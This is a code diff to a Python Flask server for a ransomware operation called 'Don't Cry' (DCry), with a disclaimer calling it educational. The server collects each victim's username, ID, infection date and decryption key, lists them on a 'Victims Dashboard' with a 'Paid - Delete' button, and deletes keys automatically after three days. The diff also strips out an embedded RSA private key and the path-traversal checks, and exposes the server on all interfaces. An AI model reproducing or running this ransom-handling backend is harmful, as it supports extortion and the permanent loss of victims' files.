@@ -9,53 +9,17 @@
 # under supervision of cybersecurity professionals.
 # The authors assume no liability for any misuse or damage caused.
 
+from flask import Flask, request, render_template_string, redirect, url_for
 import os
-import json
-import base64
-import re
+import shutil
 from markupsafe import escape as flask_escape
-from flask import Flask, request, render_template_string
-from Crypto.PublicKey import RSA
-from Crypto.Cipher import PKCS1_OAEP
-
-RSA_PRIVATE_KEY = """-----BEGIN RSA PRIVATE KEY-----
-MIIEqAIBAAKCAQEAjdIcVka2US3tcvXqQ90+XNYt5bJv10x+/0KRSph03Z/RIp/g
-OID2EEoF2Gs44BKj1C5UJsP8MyFHhWKob+WVA2vkUca2ZkA4EYxelivKGaEQlUmn
-BQJsrmniCu6afj5Gq6mazVPIm48G20g8JS/ckkvJK9TAbLkqk9HQT9waIbhwuByd
-KlcpxwPO3CZstFT3YWB+WQS0waPxqbB1PFGqPsYpPM5uBFYKj9aXXec7g6Xg992j
-FJ3j8qQ2oi05KRe5OHrMvQNXd7vAfSjzguXKX5gHpY9z8iNTPwU5XBsQCGmQnvxd
-tH80fqhDqfh8hZncYtvFGPfJ8g1TfN2huFjYzwIDAQABAoIBAAk38yeYiRlVxu2G
-Fqg6pWcbdPhNVP/FtSuahB85Mb+GN+3sPoLtvxDn/uFGdvf5vjR4nne2nZolO6Tr
-+M7tOXZzeO/n3steuUZKvYs9ZXGtCorpsrWcprvfnhXf1KMIIUffSnS2UX/rGCMA
-2wf/yHKqAnWa6rcmghhu7+/FLINO5Y24lQ4KPA/crWc1LGedG264WWPwP1juKqCk
-7JeS9RTSMHlU7doZeay9fW2kK2x+O0ieoYbiIXQzPb5ebuJnD8XLPPyjqxmoHEfd
-WuYUFsgosmvVsLbhs+Vqv37RkD8K1wMnJVGCm1ScOkRAKcU9K8zLSsGIdTZmw9hp
-81wpcOECgYkAk0baucx17R0bG71CJVXVwa5EeGV4A1EFf/HzabffCO3E9FES5JQl
-hWiFB8gy4io5KUMc5VtDdlV+5uWEMellapFBJyv9Z7zcKSEs5qVOZKe4a43SCxFz
-gv/JXC2uWTTMbspf2Q5oLw62lLECuZLuXLrkcoee8MdsZkqV03n3YX2L6SafzQUr
-DQJ5APaEJZT9ib5LEgA0JFMgpd8Qp/BBnyivw77qbPKRuiEDvxWhtE3jVwKDybP3
-IfHFD9gwwaokY33T39Cu/QdGh/K+RmPrLV+0l+DsC9bNQUou44qZelUQncvx9UCC
-mkvklkuqqm9NRY/KfXaHrhokXGbH3eIMXmssSwKBiECsTaJneaWNMXlF68UPY1Ww
-3BpunHwAWUTtD7Ht74AxQVr0OzKrJ6rk0f4v2MBeQEmxUgAZyo8tThPA2AM+9a0N
-ain0dEvYsGlTSy9higJDcIWyenknyazN/DOBT92WhOtl7R8Y54E6mczDymmJbyjD
-XUw55/7d4+kreY2rMonaItVYg7X5PgUCeHzqP4T86KSFs8xon5OD8qlS7lZ/WiAq
-2HzQm35bO77pABX9B7mEHp4Gm9nWu9ugKMQ7CJenssaa60n6sfrS0aa+pjqRfD+H
-6oIt+l3RSmlF00VzOhsKvXsP01/qDjew0DvtcknOFRak2+iJHj7e9/eZBaU68UlL
-ewKBiCUQmGSESlvfKEyGkR9h0ieCvM/8xh0WgNqWnLztWtEhF/fTMVkuqFxqrVbc
-QgNRtXbP/ulZU8c8xyiIW1O4urxsgEzXB5Fcf870D9g1THPoVCfnQQZNWt1Hblop
-rz9v0fKUbjGqZGd/5hMzmWL6Lg2AnsxBXSCjEqm1x6SFuJMMmkmOMkWwANY=
------END RSA PRIVATE KEY-----"""  # Replace with your private key if needed
+from datetime import datetime, timedelta
 
 app = Flask(__name__)
-BASE_FOLDER = os.path.abspath(os.path.expanduser("~/dcry_victims/"))
 
-os.makedirs(BASE_FOLDER, exist_ok=True)
+VICTIM_FOLDER = os.path.abspath(os.path.expanduser("~/dcry_victims/"))
 
-
-def decrypt_key(encrypted_key):
-    private_key = RSA.import_key(RSA_PRIVATE_KEY)
-    cipher_rsa = PKCS1_OAEP.new(private_key)
-    return cipher_rsa.decrypt(encrypted_key)
+os.makedirs(VICTIM_FOLDER, exist_ok=True)
 
 def sanitize_path_component(component):
     if not component:
@@ -65,139 +29,142 @@ def sanitize_path_component(component):
         return "_"
     return component
 
+def victim_is_expired(date_str, days_valid=3):
+    try:
+        infected_date = datetime.strptime(date_str, "%Y-%m-%d")
+        return datetime.now() > infected_date + timedelta(days=days_valid)
+    except Exception:
+        return False
+
+def delete_victim(victim_id):
+    path = os.path.join(VICTIM_FOLDER, victim_id)
+    if os.path.isdir(path):
+        shutil.rmtree(path)
 
 @app.route("/upload", methods=["POST"])
 def upload():
-    username = request.form.get("username")
-    victim_id_raw = request.form.get("id")
-    date = request.form.get("date")
-    key_b64_enc = request.form.get("key")
+    username = request.form.get("username", "")
+    vid = sanitize_path_component(request.form.get("id", ""))
+    date = request.form.get("date", "")
+    key = request.form.get("key", "")
 
-    if not all([username, victim_id_raw, date, key_b64_enc]):
-        return "Missing one or more required fields.", 400
+    if not vid or vid == "_":
+        return "Invalid victim ID.", 400
 
-    victim_id = sanitize_path_component(victim_id_raw)
-    if not victim_id or victim_id == "_":
-        return "Invalid victim ID format.", 400
+    folder = os.path.join(VICTIM_FOLDER, vid)
+    os.makedirs(folder, exist_ok=True)
 
-    try:
-        encrypted_key = base64.b64decode(key_b64_enc.encode())
-    except Exception as e:
-        app.logger.error(f"Invalid base64-encoded key for {victim_id}: {e}")
-        return "Invalid base64-encoded key format.", 400
+    # Save victim info
+    info_path = os.path.join(folder, "info.txt")
+    with open(info_path, "w") as f:
+        f.write(f"username={username}\n")
+        f.write(f"date={date}\n")
 
-    victim_folder_candidate = os.path.join(BASE_FOLDER, victim_id)
-    victim_folder_abs = os.path.abspath(victim_folder_candidate)
+    # Save key
+    key_path = os.path.join(folder, "key.txt")
+    with open(key_path, "w") as f:
+        f.write(key)
 
-    if not victim_folder_abs.startswith(BASE_FOLDER + os.sep):
-        app.logger.warning(f"Path traversal attempt (upload): victim_id='{victim_id_raw}', sanitized='{victim_id}', candidate='{victim_folder_candidate}', abs='{victim_folder_abs}'")
-        return "Invalid victim ID (path traversal attempt detected).", 400
-    
-    try:
-        os.makedirs(victim_folder_abs, exist_ok=True)
-    except OSError as e:
-        app.logger.error(f"Could not create directory {victim_folder_abs}: {e}")
-        return "Server error: Could not create victim directory.", 500
-
-    info_file_path = os.path.join(victim_folder_abs, "info.json")
-    key_file_path = os.path.join(victim_folder_abs, "key.txt")
-
-    if not info_file_path.startswith(victim_folder_abs + os.sep) or \
-       not key_file_path.startswith(victim_folder_abs + os.sep):
-        app.logger.error(f"Internal path safety check failed for victim_id: {victim_id}. Info: {info_file_path}, Key: {key_file_path}, Base: {victim_folder_abs}")
-        return "Invalid file path (internal safety check).", 400
-
-    try:
-        with open(info_file_path, "w") as f:
-            json.dump({"username": username, "id": victim_id, "date": date}, f, indent=2)
-
-        with open(key_file_path, "w") as f:
-            f.write(decrypt_key(encrypted_key).decode())
-    except IOError as e:
-        app.logger.error(f"Error writing files for victim {victim_id}: {e}")
-        return "Server error: Could not write victim data.", 500
-    except Exception as e:
-        app.logger.error(f"Error processing key for victim {victim_id}: {e}")
-        return "Error processing key.", 500
-
-    print(f"Saved victim: {victim_id}")
-    return f"Victim {flask_escape(victim_id)} received.", 200
-
+    return "Upload success."
 
 @app.route("/dashboard")
 def dashboard():
     victims_data = []
     try:
-        for vid_raw in os.listdir(BASE_FOLDER):
-            vid = sanitize_path_component(vid_raw)
-            if not vid or vid == "_":
+        for vid in os.listdir(VICTIM_FOLDER):
+            vid_safe = sanitize_path_component(vid)
+            if not vid_safe or vid_safe == "_":
                 continue
 
-            victim_dir_candidate = os.path.join(BASE_FOLDER, vid)
-            victim_dir_abs = os.path.abspath(victim_dir_candidate)
+            folder = os.path.join(VICTIM_FOLDER, vid_safe)
+            info_path = os.path.join(folder, "info.txt")
+            key_path = os.path.join(folder, "key.txt")
 
-            if not os.path.isdir(victim_dir_abs) or \
-               not victim_dir_abs.startswith(BASE_FOLDER + os.sep):
-                app.logger.warning(f"Skipping non-directory or potential traversal item in dashboard: raw='{vid_raw}', abs='{victim_dir_abs}'")
+            if not os.path.isfile(info_path) or not os.path.isfile(key_path):
                 continue
 
-            vpath = os.path.join(victim_dir_abs, "info.json")
-            kpath = os.path.join(victim_dir_abs, "key.txt")
+            try:
+                info = {}
+                with open(info_path, "r") as f:
+                    for line in f:
+                        if "=" in line:
+                            k, v = line.strip().split("=", 1)
+                            info[k] = v
 
-            if not vpath.startswith(victim_dir_abs + os.sep) or \
-               not kpath.startswith(victim_dir_abs + os.sep):
-                app.logger.warning(f"Skipping item due to internal path safety check for vid: {vid}")
+                if victim_is_expired(info.get("date", ""), 3):
+                    delete_victim(vid_safe)
+                    continue
+
+                with open(key_path, "r") as f:
+                    key = f.read()
+
+                victims_data.append({
+                    "username": flask_escape(info.get("username", "")),
+                    "id": flask_escape(vid_safe),
+                    "date": flask_escape(info.get("date", "")),
+                    "key": flask_escape(key)
+                })
+            except Exception as e:
+                app.logger.error(f"Error reading victim data for {vid_safe}: {e}")
                 continue
+    except Exception as e:
+        app.logger.error(f"Error listing victims: {e}")
 
-            if os.path.exists(vpath) and os.path.exists(kpath):
-                try:
-                    with open(vpath, "r") as f:
-                        info = json.load(f)
-                    with open(kpath, "r") as f:
-                        key = f.read().strip()
-                    
-                    victims_data.append({
-                        "id": info.get("id", "N/A"),
-                        "username": info.get("username", "N/A"),
-                        "date": info.get("date", "N/A"),
-                        "key": key
-                    })
-                except json.JSONDecodeError:
-                    app.logger.warning(f"Could not decode JSON for victim: {vid}")
-                except IOError:
-                    app.logger.warning(f"Could not read files for victim: {vid}")
-    except OSError as e:
-        app.logger.error(f"Error listing victims in dashboard: {e}")
-
-    html_template = """
+    html = """
     <!DOCTYPE html>
     <html>
-        <head>
-            <title>Don't Cry Dashboard</title>
-        </head>
-        <body style='font-family:monospace;background:#111;color:#eee;padding:20px;'>
-            <h1>Victim Dashboard</h1>
-            {% if victims %}
-                {% for victim in victims %}
-                <div style='border:1px solid #444;padding:10px;margin-bottom:10px;border-radius:5px;'>
-                    <b>ID:</b> {{ victim.id }}<br>
-                    <b>User:</b> {{ victim.username }}<br>
-                    <b>Date:</b> {{ victim.date }}<br>
-                    <b>Key:</b> <code>{{ victim.key }}</code>
-                </div>
-                {% endfor %}
-            {% else %}
-                <p>No victims yet.</p>
-            {% endif %}
-            {% if error_message %}
-                <p style='color:red;'>{{ error_message }}</p>
-            {% endif %}
-        </body>
+    <head>
+        <title>DCry Victims Dashboard</title>
+        <meta http-equiv="refresh" content="5">
+        <style>
+            body { background: #121212; color: #eee; font-family: monospace; }
+            table { border-collapse: collapse; width: 100%; }
+            th, td { padding: 8px; border: 1px solid #555; }
+            th { background: #222; }
+            tr:hover { background: #333; }
+            button { cursor: pointer; background: #007acc; color: white; border: none; padding: 5px 10px; border-radius: 3px; }
+            button:hover { background: #005f99; }
+        </style>
+    </head>
+    <body>
+        <h1>DCry Victims Dashboard</h1>
+        <table>
+            <thead>
+                <tr>
+                    <th>Username</th><th>ID (folder)</th><th>Infected Date</th><th>Key</th><th>Action</th>
+                </tr>
+            </thead>
+            <tbody>
+            {% for v in victims %}
+                <tr>
+                    <td>{{ v.username }}</td>
+                    <td>{{ v.id }}</td>
+                    <td>{{ v.date }}</td>
+                    <td><pre style="margin:0;">{{ v.key }}</pre></td>
+                    <td>
+                        <form method="post" action="{{ url_for('delete_victim_route') }}" onsubmit="return confirm('Delete victim {{ v.id }}?');">
+                            <input type="hidden" name="victim_id" value="{{ v.id }}">
+                            <button type="submit">Paid - Delete</button>
+                        </form>
+                    </td>
+                </tr>
+            {% endfor %}
+            </tbody>
+        </table>
+    </body>
     </html>
     """
-    error_msg = "Error loading victim data." if 'e' in locals() and isinstance(e, OSError) else None
-    return render_template_string(html_template, victims=victims_data, error_message=error_msg)
 
+    return render_template_string(html, victims=victims_data)
+
+@app.route("/delete_victim", methods=["POST"])
+def delete_victim_route():
+    victim_id_raw = request.form.get("victim_id")
+    victim_id = sanitize_path_component(victim_id_raw)
+    if not victim_id or victim_id == "_":
+        return "Invalid victim ID.", 400
+    delete_victim(victim_id)
+    return redirect(url_for("dashboard"))
 
 if __name__ == "__main__":
-    app.run(host="127.0.0.1", port=5000, debug=False)
+    app.run(host="0.0.0.0", port=8080)
